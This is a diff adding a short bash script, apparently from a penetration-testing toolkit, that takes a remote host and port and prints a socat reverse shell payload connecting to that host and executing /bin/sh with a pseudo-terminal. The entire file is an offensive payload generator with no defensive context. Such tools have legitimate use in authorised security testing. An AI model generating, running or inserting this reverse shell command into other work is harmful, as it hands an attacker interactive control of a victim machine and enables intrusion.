@@ -1,0 +1,22 @@
+
+#!/bin/bash
+
+function Craft_linux_socat_reverse_shell(){
+
+        if [ -z "$1" ] || [ -z "$2" ]
+        then
+                printf "Auto-gen Linux socat reverse tcp shell\n"
+                printf "Usage bash linux_socat-reverse-tcp <rhost> <rport>\n"
+                exit
+        fi
+
+        rhost="$1"
+        rport="$2"
+
+        printf "\n"
+        printf "socat tcp-connect:$rhost:$rport exec:/bin/sh,pty,stderr,setsid,sigint,sane"
+        printf "\n\n[\e[0;32m+\e[0m] Payload created.\n"
+
+}
+
+Craft_linux_socat_reverse_shell "$1" "$2"
